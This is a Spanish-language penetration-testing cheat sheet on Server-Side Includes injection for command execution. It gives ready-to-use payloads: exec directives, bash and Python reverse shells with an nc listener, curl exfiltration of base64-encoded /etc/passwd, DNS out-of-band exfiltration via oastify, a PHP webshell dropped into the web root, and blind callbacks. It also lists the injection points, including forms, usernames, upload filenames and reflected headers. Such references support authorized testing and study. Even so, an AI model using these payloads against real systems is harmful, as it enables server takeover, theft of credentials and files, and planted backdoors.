---
aliases:
  - SSI exec cmd
  - SSI RCE
tags:
  - type/cheatsheet
  - vuln/ssi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Ejecución de Comandos

***

## Cheatsheet

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|---|
| **RCE básico (Linux)** | `<!--#exec cmd="id" -->` | Si SSI activo con `Options +Includes` o `+IncludesNOEXEC` permitiendo exec. |
| **RCE básico (Windows)** | `<!--#exec cmd="whoami" -->` | Apache/IIS con SSI habilitado. |
| **Reverse shell (bash)** | `<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" -->` | Shell interactiva. Tener listener `nc -lvnp <PORT>`. |
| **Reverse shell (python)** | `<!--#exec cmd="python3 -c 'import socket,pty,os;s=socket.socket();s.connect((\"<IP>\",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'" -->` | Python fallback si bash filtrado. |
| **Exfil vía curl** | `<!--#exec cmd="curl <IP>:<PORT>/?d=$(cat /etc/passwd\|base64 -w0)" -->` | Data en query string, base64 para no romper URL. |
| **Exfil vía DNS (OOB)** | `<!--#exec cmd="nslookup $(whoami).<collab-id>.oastify.com" -->` | Bypass egress filtering HTTP. |
| **Webshell drop** | `<!--#exec cmd="echo '<?php system($_GET[0]);?>' > /var/www/html/s.php" -->` | Depende de permisos de escritura web user. |
| **`cmd` quoting alternativo** | `<!--#exec cmd='id' -->` | Comillas simples si `"` filtradas. |
^ssi-exec

___

## Overview

Directiva `#exec cmd` permite ejecutar **cualquier comando shell** en el contexto del usuario que corre el webserver (usualmente `www-data` / `apache` / `IUSR`). Vector más directo a RCE en apps con SSI habilitado.

### Requisitos para que funcione

1. Apache con `mod_include` habilitado (o IIS con SSI habilitado).
2. Directiva `Options +Includes` en el vhost/directory.
3. Archivos terminados en `.shtml`, `.shtm`, `.stm` — o MIME-type `text/x-server-parsed-html` en `AddType`.
4. `Options +IncludesNOEXEC` **desactiva** `#exec` específicamente — si está, usar [[SSI - Inclusión de Archivos]] como fallback.

### Inyección típica

El payload se inyecta en cualquier campo reflejado dentro de un archivo `.shtml`:
- Formularios de contacto, búsqueda, comentarios.
- Nombres de usuario / profile bio.
- File upload con filename controlado.
- Headers HTTP reflejados (User-Agent, Referer).

El server parsea el archivo al servirlo → ejecuta directivas SSI embebidas → incluye output del comando en la respuesta HTML.

### Variantes de sintaxis

```html
<!--#exec cmd="ls" -->
<!--#exec cmd="ls /" -->
<!--#exec cgi="/cgi-bin/foo.cgi" -->    <!-- CGI variant (menos común) -->
```

### Si la respuesta no refleja output

Blind exec — usar técnicas OOB:
- Callback HTTP: `<!--#exec cmd="curl <collab>/?r=$(id|base64)" -->`
- Time delay: `<!--#exec cmd="sleep 10" -->`
- DNS exfil: `<!--#exec cmd="nslookup $(whoami).<collab-id>.oastify.com" -->`

***
